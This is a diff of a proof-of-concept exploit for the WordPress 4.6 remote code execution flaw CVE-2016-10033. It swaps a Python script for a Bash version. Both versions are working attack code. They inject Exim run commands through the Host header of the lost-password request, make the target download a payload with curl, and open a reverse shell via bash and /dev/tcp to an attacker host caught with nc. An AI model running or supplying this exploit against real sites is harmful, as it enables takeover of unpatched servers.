@@ -1,72 +1,107 @@
-#!/usr/bin/env python 
-import SocketServer, SimpleHTTPServer, threading
-import subprocess, os, sys, time, shutil
-import requests 
+#!/bin/bash
+#
+# WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit
+# CVE-2016-10033
+#
+# wordpress-rce-exploit.sh
+# Improved RCE PoC Expoint by
+#
+# Jorge Marin (@chipironcin)
+#
+# Based on wordpress-rce-exploit.sh (ver. 1.0) from https://exploitbox.io
+# Discovered and coded by
+#
+# Dawid Golunski (@dawid_golunski)
+# https://legalhackers.com
+#
+# Full advisory URL:
+# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
+#
+# Usage:
+# ./wordpress-rce-exploit.sh target-wordpress-url [reverse-host]
+#
+#
+# Disclaimer:
+# For testing purposes only
+# -----------------------------------------------------------------
 
-#print usage if improper # of args
-if len(sys.argv) == 1 or len(sys.argv) > 4:
-    print 'usage:   ./CVE-2016-10033.py <target site> <your ip:port> <username>'
-    print 'example: ./CVE-2016-10033.py http://site.com/ 1.2.3.4:4444 admin'
-    quit()
+rev_host="127.0.0.1"
+target="localhost"
 
-#set vars
-host_header=''
-url = sys.argv[1]
-host, port = sys.argv[2].split(':')
-username = sys.argv[3]
+if [ "$#" -lt 1 ]; then
+  echo -e "Usage:\n$0 target-wordpress-url reverse-host\n"
+  exit 1
+fi
+if [ "x$1" != "x" ]; then target="$1"; else exit 1; fi
+if [ "x$2" != "x" ]; then rev_host="$2"; fi
 
-#make temp directory for payload
-cwd = os.getcwd()
-if not os.path.exists(cwd+'/tmp'):
-	os.makedirs(cwd+'/tmp')
-os.chdir(cwd+'/tmp')
+# A POSIX variable
+# Reset in case getopts has been used previously in the shell.
+OPTIND=1
+while getopts "r:" opt; do
+    case "$opt" in
+    f)  rev_host=$OPTARG
+        ;;
+    esac
+done
+shift $((OPTIND-1))
 
-#method for converting special characters
-def prep_header(cmd): 
-    cmd='\${run{'+cmd+'}}'
-    cmd = cmd.replace('/', '${substr{0}{1}{$spool_directory}}') #convert /
-    cmd = cmd.replace(' ', '${substr{10}{1}{$tod_log}}') #convert ' '
+function prep_host_header() {
+      cmd="$1"
+      rce_cmd="\${run{$cmd}}";
 
-    host_header='target(any -froot@localhost -be '+rce_cmd+' null)'
+      # replace / with ${substr{0}{1}{$spool_directory}}
+      # sed 's^/^${substr{0}{1}{$spool_directory}}^g'
+      rce_cmd="$(echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g')"
 
-#create payload
-print '[+] Generating Payload'
-rev_cmd = '(sleep 10s && nohup bash -i >/dev/tcp/'+host+'/'+port+' 0<&1 2>&1) &'
-with open('rce.txt', 'w') as inf:
-        inf.write(rev_cmd)
+      # replace ' ' (space) with
+      # sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
+      rce_cmd="$(echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g')"
+      # return "target(any -froot@localhost -be $rce_cmd null)"
+      host_header="target(any -froot@localhost -be $rce_cmd null)"
+      return 0
+}
 
-#serve the payload; threading is meant for easy shutdown at end
-print '[+] Hosting payload on simple server'
-httpd = SocketServer.TCPServer((host, 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
-thread = threading.Thread(target = httpd.serve_forever)
-thread.daemon = True
-thread.start()
+echo -ne "\e[91m[*]\033[0m"
+read -p " Sure you want to get a shell on the target '$target' ? [y/N] " choice
+echo
 
-#write payload to host
-print '[+] Downloading payload to remote host'
-run_cmd = '/usr/bin/curl -o/tmp/rce '+host+'/rce.txt'
-prep_header(run_cmd)
-headers = {'Host':host_header,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'}
-r = requests.post(url+'wp-login.php?action=lostpassword',              #lost password URL
-    headers=headers, allow_redirects=True, verify=False,               #standard request info
-    data={'user_login':username, 'wp-submit':'Get+New+Password'})      #POST info
 
-#wait two minutes for slower connections/delays/etc
-time.sleep(60)
+if [ "$choice" == "y" ]; then
 
-#kill server
-print '[+] Shutting down server'
-httpd.shutdown()
-shutil.rmtree(cwd+'/tmp')
+echo -e "\e[92m[*]\033[0m Guess I can't argue with that... Let's get started...\n"
+echo -e "\e[92m[+]\033[0m Connected to the target"
 
-#execute payload stored on host
-print '[+] Executing payload on remote host'
-cmd = '/bin/bash /tmp/rce'
-prep_header(cmd)
-r = requests.post(url+'wp-login.php?action=lostpassword',              #lost password URL
-    headers=headers, allow_redirects=True, verify=False,               #standard request info
-    data={'user_login':username, 'wp-submit':'Get+New+Password'})      #POST info
+# Serve payload/bash script on :80
+RCE_exec_cmd="sleep 3s; nohup bash -i >/dev/tcp/$rev_host/1337 0<&1 2>&1 &"
+echo "$RCE_exec_cmd" > rce.txt
+python -mSimpleHTTPServer 80 2>/dev/null >&2 &
+serverPID=$!
 
-#start reverse listener with nc
-print '[+] Starting reverse listener'
-subprocess.call(["sudo","nc","-lvp "+port])
+# Save payload on the target in /tmp/rce
+cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
+prep_host_header "$cmd"
+curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
+echo -e "\n\e[92m[+]\e[0m Payload sent successfully"
+
+kill $serverPID
+wait $serverPID 2>/dev/null
+rm -R "./rce.txt"
+
+# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
+cmd="/bin/bash /tmp/rce"
+prep_host_header "$cmd"
+curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword" &
+echo -e "\n\e[92m[+]\033[0m Payload executed!"
+
+echo -e "\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n"
+nc -vv -l -p 1337
+echo
+else
+echo -e "\e[92m[+]\033[0m Responsible choice ;) Exiting.\n"
+exit 0
+
+fi
+
+echo "Exiting..."
+exit 0
